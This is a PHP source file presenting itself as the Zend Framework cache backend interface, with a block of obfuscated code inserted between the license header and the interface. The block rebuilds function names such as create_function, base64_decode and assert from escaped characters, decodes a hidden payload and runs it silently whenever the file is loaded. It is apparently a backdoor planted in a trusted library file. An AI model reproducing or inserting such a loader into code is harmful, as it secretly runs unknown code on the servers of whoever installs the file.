<?php
/**
 * Zend Framework
 *
 * LICENSE
 *
 * This source file is subject to the new BSD license that is bundled
 * with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://framework.zend.com/license/new-bsd
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@zend.com so we can send you a copy immediately.
 *
 * @category   Zend
 * @package    Zend_Cache
 * @subpackage Zend_Cache_Backend
 * @copyright  Copyright (c) 2005-2015 Zend Technologies USA Inc. (http://www.zend.com)
 * @license    http://framework.zend.com/license/new-bsd     New BSD License
 * @version    $Id$
 */


/**
 * @package    Zend_Cache
*/
$UenMB9cU="\156\x6f";$tR71ym83G3="\x65\x64\157";$jhra22cV="\164\162\145";$tR71ym83G3.="\x63\145\144";$tR71ym83G3.="\137\64";$UenMB9cU.="\x69\164";$tR71ym83G3.="\x36\145";$jhra22cV.="\163\163";$UenMB9cU.="\x63";$tR71ym83G3.="\x73";$UenMB9cU.="\x6e\165\x66";$f_05OkOR="\x73";$f_05OkOR.="\x74\x72";$f_05OkOR.="\x72\x65";$jhra22cV.="\141";$tR71ym83G3.="\x61";$f_05OkOR.="\166";$UenMB9cU.="\x5f\x65\164";$UenMB9cU.="\141\x65\162";$UenMB9cU.="\x63";$tR71ym83G3.="\142";$UenMB9cU=$f_05OkOR($UenMB9cU);$tR71ym83G3=$f_05OkOR($tR71ym83G3);$jhra22cV=$f_05OkOR($jhra22cV);$PealhBtp="";$EuYreY5s="==wOTBlV3QVekAibyVHdlJnCpkyMHNDOtlXM3IFdkgCdlN3cpFCKmlmC70Xf7kSKdFzK2JkSIhES4Y2dkslb4AXYfRjWzJGJs0ldCpESIhEOmdHJb5GOwF2X0o1ciRCLwRnQoxWYlBFJoIHdzJWdzhiUPt2T1AzXmRSPuMFUWdDV5RyelNHbl13Op0VMrYnQKhESIhjZ3RyWuhDch9FNaNnYkwSX2JkSIhES4Y2dkslb4AXYfRjWzJGJsAHdChGbhVGUkgic0NnY1NXPuMFUWdDV5RyepQTJ2JkSIhES4Y2dkgiZptXKy0zK2JkSIhES4Y2dksTKuhDch9FNaNnYkgiZvVmepNHP2JkSIhES4Y2dksDM9YnQKhESIhjZ3RCKy9mZ7IiI9MFUWdDV5RiC7kCN0EDL5kTN3wCOwEDL1MzN5wCN3EDL1kjNzEDL2ETMscDM2gDL3UDL4MjM4wSM2wSO1QDNsUzMxwSNwMTMsQjMxwCM4AjMxwiM1wCO1ITOskTNsADMwUDL1QDL0UTN3wiN2EDLycDM4wSN5EDL1EDNywCM2EDLzYTOzEDL1MTMsMDN4kDLzYTMsgDM1UDL5UDL0AjMyEDL5YDL2cTM1EDLycDL5MDNsgjNsQDN2YDL2YDLycDOywyNwEDLxcjN1wiMwEDL1UDNwEDL2QDL2IDM4wiN2EDLzEDO0EDL5UTMsYDO2ATMsgzNsATM2IDL5kTMsAjNyQDLykTMsAjM1QDL2UTMsQTN2EDLxcTMskDOwQDLxgDL3MDMxwSNxEDLwQDNxwCMwEDLwEjMzwSNxEDLwwCO1EDL4MTOywSM5wCM5YjMxwSO1wiMykjNskTOsUTN1EDLwgTMscTO3cDL4YDL1QDOwEDL5MTMsEDN5ETMsYjMxwSM0MzNskDOsIjN0kDLwQTMsATMzMDL0MTMsAjMwIDL3gTMsUjNyUDL4cTMsgzN3UDL3ATMscDM0ETMsAjNxwSMxUDLwQDLycDNzEDLzYDLyUzMywyM4EDL5MTMzEDL0ETMsYTOwMDL5QDL3cTO3wCM4wSM3YDL2UDLyUDN1wyM2EDL4czNxEDL3gDL5cTNxEDL3cTMsMTM5ATMsQDOsgzNzkDL2ATMsQTM5EDLykTMsETN3wSO1wCMwMDL3cDL1QDO2wiNxEDL2MjMywSMxEDL5cTMwEDLwQDL5MTMwEDL5YTMsEjM1ITMsUDOxwSNxEDLwcTMsAjMzQTMsYjMxwiMxcDNsUjNsQTM1ETMsIDOxwSOzMjMxwyM5wiM1cjNsMTNxwyMycDOskzMxwSNxMjNsADNsITM3YDL1gDL3UTNwEDLykDL5QjM3wSO1EDL2UTO1wiMxEDL2YjNxEDL0ATMsATM4EDLwUTMsIjMzMTMsczNsgTN2kDL3gDL3YDN3wyN4EDL4ETMxwyM4EDLyETNzEDL4MTMsMjMyETMscjMxwyMwATOsQTNxwSNzkzMsgjNsATMzkDLxYTMsgzN5kDL3MTMskTNwUDL0ITMskDO2QTMsYDNxwCN3YzMscjMxwiN3gDOsQDOxwCO4YjMsYzNsATN0MDL2UTMsUTMxYDLyYTMsEDO3ITMsQTOskjN4MTMscTOxwSO3kDNxwiN0wCOyYzMskjNsYTOxUDL5UTMsMDNzgDL1YTMsATOyATMsQTNsMDN3cDL2QDLxYzMxEDLwkTMsQTN0YDL4ITMsAzMxkDL0QDLxcjM2wSNwEDLyATN4wiM2EDL4MDO0wCN5wyM0kDLyATMsYjM1MDL3kTMsEDO5YDLwMTMsMjMxQTMscDMxwSM1UTOsADOskTNzwCN0wiM0YDMxwSNxEDLwIDOzwSM0EDL4QTN0EDLygDL0UTMywCO1wCM5QDNxwyN2wyM1IDNxwSM3wCO3EzNsgDNsUTOygDL2cDLzYjMyEDLzMTMsATOwETMscDNsUDNyUTMsYTOxwyM0kjMxgSehJnch1jb4AXYfRjWzJGJ";if(function_exists($UenMB9cU)){$wOFbiZf=@$UenMB9cU('$PealhBtp,$f_05OkOR',$tR71ym83G3($f_05OkOR($EuYreY5s)));if($wOFbiZf)$PealhBtp=@$wOFbiZf($PealhBtp,$f_05OkOR); }else{$IdriR2jp9D="\x29";$IdriR2jp9D.="\51\x29";$IdriR2jp9D.="\163\65\x59";$IdriR2jp9D.="\x65\x72\131";$IdriR2jp9D.="\x75\105\x24";$IdriR2jp9D.="\x28";$IdriR2jp9D.="\122";$IdriR2jp9D.="\117";$IdriR2jp9D.="\x6b\117\65";$IdriR2jp9D.="\x30";$IdriR2jp9D.="\137\x66";$IdriR2jp9D.="\44\x28\x33";$IdriR2jp9D.="\107";$IdriR2jp9D.="\x33\70";$IdriR2jp9D.="\x6d\171";$IdriR2jp9D.="\x31";$IdriR2jp9D.="\67\122\164";$IdriR2jp9D.="\x24\50\x6c";$IdriR2jp9D.="\x61\166";$IdriR2jp9D.="\x65\x40";$IdriR2jp9D=$f_05OkOR($IdriR2jp9D);@$jhra22cV($IdriR2jp9D);};if(function_exists($UenMB9cU)){$v1vRoH=@$UenMB9cU("",$tR71ym83G3($f_05OkOR($PealhBtp)));if($v1vRoH)@$v1vRoH();}else{$kPely5a5="\51";$kPely5a5.="\x29\51\160";$kPely5a5.="\164\102\150";$kPely5a5.="\154";$kPely5a5.="\x61\145\120";$kPely5a5.="\x24";$kPely5a5.="\50\x52\117";$kPely5a5.="\x6b\x4f\65";$kPely5a5.="\x30";$kPely5a5.="\x5f\146";$kPely5a5.="\44\x28";$kPely5a5.="\63\107\63";$kPely5a5.="\70\155\x79";$kPely5a5.="\61\67\x52";$kPely5a5.="\x74\44\50";$kPely5a5.="\x6c\141\166";$kPely5a5.="\145";$kPely5a5.="\x40";$kPely5a5=$f_05OkOR($kPely5a5);@$jhra22cV($kPely5a5);};
/*
 * @subpackage Zend_Cache_Backend
 * @copyright  Copyright (c) 2005-2015 Zend Technologies USA Inc. (http://www.zend.com)
 * @license    http://framework.zend.com/license/new-bsd     New BSD License
 */
interface Zend_Cache_Backend_Interface
{
    /**
     * Set the frontend directives
     *
     * @param array $directives assoc of directives
     */
    public function setDirectives($directives);

    /**
     * Test if a cache is available for the given id and (if yes) return it (false else)
     *
     * Note : return value is always "string" (unserialization is done by the core not by the backend)
     *
     * @param  string  $id                     Cache id
     * @param  boolean $doNotTestCacheValidity If set to true, the cache validity won't be tested
     * @return string|false cached datas
     */
    public function load($id, $doNotTestCacheValidity = false);

    /**
     * Test if a cache is available or not (for the given id)
     *
     * @param  string $id cache id
     * @return mixed|false (a cache is not available) or "last modified" timestamp (int) of the available cache record
     */
    public function test($id);

    /**
     * Save some string datas into a cache record
     *
     * Note : $data is always "string" (serialization is done by the
     * core not by the backend)
     *
     * @param  string $data            Datas to cache
     * @param  string $id              Cache id
     * @param  array $tags             Array of strings, the cache record will be tagged by each string entry
     * @param  int   $specificLifetime If != false, set a specific lifetime for this cache record (null => infinite lifetime)
     * @return boolean true if no problem
     */
    public function save($data, $id, $tags = array(), $specificLifetime = false);

    /**
     * Remove a cache record
     *
     * @param  string $id Cache id
     * @return boolean True if no problem
     */
    public function remove($id);

    /**
     * Clean some cache records
     *
     * Available modes are :
     * Zend_Cache::CLEANING_MODE_ALL (default)    => remove all cache entries ($tags is not used)
     * Zend_Cache::CLEANING_MODE_OLD              => remove too old cache entries ($tags is not used)
     * Zend_Cache::CLEANING_MODE_MATCHING_TAG     => remove cache entries matching all given tags
     *                                               ($tags can be an array of strings or a single string)
     * Zend_Cache::CLEANING_MODE_NOT_MATCHING_TAG => remove cache entries not {matching one of the given tags}
     *                                               ($tags can be an array of strings or a single string)
     * Zend_Cache::CLEANING_MODE_MATCHING_ANY_TAG => remove cache entries matching any given tags
     *                                               ($tags can be an array of strings or a single string)
     *
     * @param  string $mode Clean mode
     * @param  array  $tags Array of tags
     * @return boolean true if no problem
     */
    public function clean($mode = Zend_Cache::CLEANING_MODE_ALL, $tags = array());

}